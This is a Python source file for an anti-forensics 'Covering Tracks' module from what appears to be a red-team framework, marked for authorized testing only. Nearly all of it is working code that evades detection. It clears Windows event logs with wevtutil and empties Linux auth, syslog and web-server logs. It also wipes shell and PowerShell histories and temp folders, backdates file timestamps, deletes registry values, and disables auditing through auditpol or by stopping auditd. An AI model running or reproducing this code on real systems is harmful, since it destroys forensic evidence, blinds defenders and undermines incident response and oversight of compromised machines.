"""
Covering Tracks Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The Covering Tracks module manipulates logs, removes artifacts, and performs anti-forensics
techniques to evade detection. This module is critical for maintaining stealth during
red team engagements.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.covering_tracks import CoveringTracks
    
    # Initialize logger and module
    logger = FrameworkLogger("covering_tracks")
    covering = CoveringTracks(logger)
    
    # Clear logs
    log_result = covering.clear_logs(log_types=["system", "application", "security"])
    print(f"Logs cleared: {log_result['logs_cleared']}")
    
    # Remove artifacts
    artifact_result = covering.remove_artifacts()
    print(f"Artifacts removed: {artifact_result['artifacts_removed']}")
    
    # Modify timestamps
    timestamp_result = covering.modify_timestamps("/path/to/file")
    print(f"Timestamps modified: {timestamp_result['success']}")
    
    # Clear command history
    history_result = covering.clear_command_history()
    print(f"History cleared: {history_result['success']}")

Red Team Use Cases:
- Log manipulation and deletion
- Artifact removal
- Timestamp modification
- Command history clearing
- Event log clearing
- Registry cleanup
- File timestamp manipulation
- Anti-forensics techniques
"""

from typing import Dict, List, Optional
import time
import os
import subprocess
import platform
import stat
from pathlib import Path
from utils.logger import FrameworkLogger
from utils.stealth_file_access import StealthFileAccess


class CoveringTracks:
    """Covering tracks module"""
    
    def __init__(self, logger: FrameworkLogger):
        """
        Initialize covering tracks module
        
        Args:
            logger: Logger instance
        """
        self.logger = logger
        self.actions_performed = []
    
    def clear_logs(self, log_types: Optional[List[str]] = None) -> Dict:
        """
        Clear system logs
        
        Args:
            log_types: Types of logs to clear (system, application, security, etc.)
        
        Returns:
            Dictionary containing log clearing results
        """
        self.logger.info("Clearing system logs")
        
        if log_types is None:
            log_types = ["system", "application", "security"]
        
        results = {
            "logs_cleared": [],
            "total_cleared": 0,
            "timestamp": time.time()
        }
        
        try:
            if platform.system() == "Windows":
                for log_type in log_types:
                    try:
                        cmd = f'wevtutil cl {log_type}'
                        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                        
                        if result.returncode == 0:
                            results["logs_cleared"].append(log_type)
                            results["total_cleared"] += 1
                    except Exception as e:
                        self.logger.debug(f"Failed to clear {log_type} log: {e}")
            else:
                # Linux log clearing (use stealth access)
                log_paths = [
                    "/var/log/auth.log",
                    "/var/log/syslog",
                    "/var/log/messages",
                    "/var/log/secure",
                    "/var/log/apache2/access.log",
                    "/var/log/apache2/error.log",
                    "/var/log/nginx/access.log",
                    "/var/log/nginx/error.log"
                ]
                
                for log_path in log_paths:
                    try:
                        # Check access first
                        if StealthFileAccess.can_access(log_path):
                            # Use stealth write to clear
                            if StealthFileAccess.safe_write_file(log_path, ''):
                                results["logs_cleared"].append(log_path)
                                results["total_cleared"] += 1
                    except Exception as e:
                        self.logger.debug(f"Failed to clear {log_path}: {e}")
                        
        except Exception as e:
            self.logger.error(f"Log clearing failed: {e}")
            results["error"] = str(e)
        
        self.actions_performed.append({"action": "clear_logs", "results": results})
        return results
    
    def remove_artifacts(self, artifact_paths: Optional[List[str]] = None) -> Dict:
        """
        Remove artifacts and traces
        
        Args:
            artifact_paths: Specific paths to clean (optional)
        
        Returns:
            Dictionary containing artifact removal results
        """
        self.logger.info("Removing artifacts")
        
        results = {
            "artifacts_removed": [],
            "total_removed": 0,
            "timestamp": time.time()
        }
        
        if artifact_paths is None:
            # Common artifact locations
            if platform.system() == "Windows":
                artifact_paths = [
                    os.path.expanduser("~\\AppData\\Local\\Temp"),
                    os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\Recent"),
                    os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
                ]
            else:
                # Use safe paths that don't trigger permission prompts
                artifact_paths = [
                    "/tmp",
                    "/var/tmp"
                ]
                
                # Only add history files if accessible
                history_files = [
                    os.path.expanduser("~/.bash_history"),
                    os.path.expanduser("~/.zsh_history"),
                    os.path.expanduser("~/.mysql_history")
                ]
                
                for hist_file in history_files:
                    if StealthFileAccess.can_access(hist_file) and not StealthFileAccess.is_protected_path(hist_file):
                        artifact_paths.append(hist_file)
        
        for artifact_path in artifact_paths:
            try:
                # Check access first without triggering permission prompts
                if not StealthFileAccess.can_access(artifact_path):
                    continue
                
                # Skip protected paths
                if StealthFileAccess.is_protected_path(artifact_path):
                    continue
                
                if os.path.isdir(artifact_path):
                    # Clear directory contents using stealth access
                    items = StealthFileAccess.safe_list_directory(artifact_path)
                    for item in items:
                        item_path = os.path.join(artifact_path, item)
                        try:
                            if StealthFileAccess.can_access(item_path):
                                if os.path.isdir(item_path):
                                    import shutil
                                    shutil.rmtree(item_path)
                                else:
                                    os.remove(item_path)
                        except Exception:
                            pass
                else:
                    # Clear file using stealth write
                    StealthFileAccess.safe_write_file(artifact_path, '')
                
                results["artifacts_removed"].append(artifact_path)
                results["total_removed"] += 1
                    
            except Exception as e:
                self.logger.debug(f"Failed to remove {artifact_path}: {e}")
        
        self.actions_performed.append({"action": "remove_artifacts", "results": results})
        return results
    
    def modify_timestamps(self, file_path: str, days_offset: int = -30) -> Dict:
        """
        Modify file timestamps
        
        Args:
            file_path: Path to file
            days_offset: Days to offset timestamp (negative = past)
        
        Returns:
            Dictionary containing timestamp modification results
        """
        self.logger.info(f"Modifying timestamps for {file_path}")
        
        results = {
            "file": file_path,
            "success": False,
            "timestamp": time.time()
        }
        
        try:
            if os.path.exists(file_path):
                import datetime
                
                # Calculate new timestamp
                current_time = os.path.getmtime(file_path)
                new_time = current_time + (days_offset * 86400)
                
                # Modify access and modification times
                os.utime(file_path, (new_time, new_time))
                
                results["success"] = True
                results["new_timestamp"] = new_time
                
        except Exception as e:
            self.logger.error(f"Timestamp modification failed: {e}")
            results["error"] = str(e)
        
        self.actions_performed.append({"action": "modify_timestamps", "results": results})
        return results
    
    def clear_command_history(self) -> Dict:
        """
        Clear command history
        
        Returns:
            Dictionary containing history clearing results
        """
        self.logger.info("Clearing command history")
        
        results = {
            "success": False,
            "histories_cleared": [],
            "timestamp": time.time()
        }
        
        try:
            if platform.system() == "Windows":
                # Clear PowerShell history
                cmd = "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
                subprocess.run(["powershell", "-Command", cmd], timeout=5)
                results["histories_cleared"].append("powershell")
                
            else:
                # Clear bash history
                history_files = [
                    os.path.expanduser("~/.bash_history"),
                    os.path.expanduser("~/.zsh_history"),
                    os.path.expanduser("~/.history")
                ]
                
                for history_file in history_files:
                    if os.path.exists(history_file):
                        try:
                            with open(history_file, 'w') as f:
                                f.write('')
                            results["histories_cleared"].append(history_file)
                        except Exception:
                            pass
                
                # Clear current session history
                try:
                    os.environ['HISTFILE'] = ''
                    os.system('history -c')
                except Exception:
                    pass
            
            results["success"] = len(results["histories_cleared"]) > 0
            
        except Exception as e:
            self.logger.error(f"History clearing failed: {e}")
            results["error"] = str(e)
        
        self.actions_performed.append({"action": "clear_command_history", "results": results})
        return results
    
    def clear_event_logs(self, log_names: Optional[List[str]] = None) -> Dict:
        """
        Clear Windows event logs
        
        Args:
            log_names: Specific log names to clear (optional)
        
        Returns:
            Dictionary containing event log clearing results
        """
        self.logger.info("Clearing event logs")
        
        if log_names is None:
            log_names = ["System", "Application", "Security"]
        
        results = {
            "logs_cleared": [],
            "total_cleared": 0,
            "timestamp": time.time()
        }
        
        if platform.system() == "Windows":
            for log_name in log_names:
                try:
                    cmd = f'wevtutil cl {log_name}'
                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                    
                    if result.returncode == 0:
                        results["logs_cleared"].append(log_name)
                        results["total_cleared"] += 1
                except Exception as e:
                    self.logger.debug(f"Failed to clear {log_name}: {e}")
        else:
            results["note"] = "Event log clearing is Windows-specific"
        
        self.actions_performed.append({"action": "clear_event_logs", "results": results})
        return results
    
    def modify_registry(self, key_path: str, value_name: str, delete: bool = False) -> Dict:
        """
        Modify Windows registry
        
        Args:
            key_path: Registry key path
            value_name: Value name
            delete: Whether to delete the value
        
        Returns:
            Dictionary containing registry modification results
        """
        self.logger.info(f"Modifying registry: {key_path}")
        
        results = {
            "key_path": key_path,
            "value_name": value_name,
            "success": False,
            "timestamp": time.time()
        }
        
        if platform.system() == "Windows":
            try:
                if delete:
                    cmd = f'reg delete "{key_path}" /v {value_name} /f'
                else:
                    cmd = f'reg add "{key_path}" /v {value_name} /t REG_SZ /d "" /f'
                
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                results["success"] = result.returncode == 0
                
            except Exception as e:
                self.logger.error(f"Registry modification failed: {e}")
                results["error"] = str(e)
        else:
            results["note"] = "Registry modification is Windows-specific"
        
        self.actions_performed.append({"action": "modify_registry", "results": results})
        return results
    
    def disable_auditing(self) -> Dict:
        """
        Disable system auditing
        
        Returns:
            Dictionary containing auditing disable results
        """
        self.logger.info("Disabling system auditing")
        
        results = {
            "success": False,
            "timestamp": time.time()
        }
        
        if platform.system() == "Windows":
            try:
                # Disable audit policy
                cmd = 'auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable'
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                results["success"] = result.returncode == 0
            except Exception as e:
                self.logger.error(f"Failed to disable auditing: {e}")
                results["error"] = str(e)
        else:
            # Linux audit disabling
            try:
                cmd = "service auditd stop"
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                results["success"] = result.returncode == 0
            except Exception as e:
                self.logger.error(f"Failed to disable auditing: {e}")
                results["error"] = str(e)
        
        self.actions_performed.append({"action": "disable_auditing", "results": results})
        return results
    
    def get_actions_performed(self) -> List[Dict]:
        """Get all actions performed"""
        return self.actions_performed

